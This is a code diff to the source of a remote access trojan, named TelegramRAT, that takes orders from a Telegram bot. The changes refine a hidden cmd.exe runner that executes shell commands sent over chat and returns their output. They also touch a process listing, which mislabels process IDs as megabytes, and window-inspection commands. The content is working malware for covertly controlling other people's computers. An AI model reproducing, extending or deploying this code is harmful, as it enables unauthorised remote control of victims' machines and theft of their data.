@@ -104,7 +104,6 @@ namespace TelegramRAT
 
                 Task.Delay(1000).Wait();
             }
-
         }
 
         public static async Task UpdateWorker(Update[] Updates)
@@ -230,15 +229,19 @@ namespace TelegramRAT
                             cmd.StartInfo.FileName = "cmd.exe";
                             cmd.StartInfo.CreateNoWindow = true;
 
-                            cmd.StartInfo.Arguments = "/C " + model.RawArgs;
+                            cmd.StartInfo.Arguments = "/c " + model.RawArgs;
                             cmd.StartInfo.RedirectStandardOutput = true;
-                            cmd.StartInfo.UseShellExecute = true;
+                            cmd.StartInfo.RedirectStandardError = true;
+                            cmd.StartInfo.UseShellExecute = false;
 
                             cmd.Start();
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "Started!", replyToMessageId: update.Message.MessageId);
-                            cmd.WaitForExit();
+                            cmd.WaitForExit(1000);
+                            //cmd.Kill(true);
 
                             string Output = cmd.StandardOutput.ReadToEnd();
+
+                            Output = string.Join(string.Empty, Output.Take(4096));
 
                             if (Output.Length == 0)
                                 Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!", replyToMessageId: update.Message.MessageId);
@@ -347,8 +350,9 @@ namespace TelegramRAT
 
                         foreach (Process p in processCollection)
                         {
-                            Concat += $"<code>{p.ProcessName}</code>\n";
-                            if (i == 100)
+                            
+                            Concat += $"<code>{p.ProcessName}</code> - <code>{p.Id}</code>mb\n";
+                            if (i == 50)
                             {
                                 await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                                 Concat = "";
@@ -934,14 +938,13 @@ namespace TelegramRAT
                                 {
                                     hWnd = WinAPI.FindWindow(null, string.Join(string.Empty, model.Args.Skip(1)));
                                 }
-                                if (hWnd == IntPtr.Zero)
+                                if (hWnd == IntPtr.Zero || WinAPI.IsWindow(hWnd) is false)
                                 {
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "Window not found!", replyToMessageId: update.Message.MessageId);
                                     return;
                                 }
                                 switch (model.Args[0])
                                 {
-
                                     case "info":
                                         Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
                                         string info = "" +
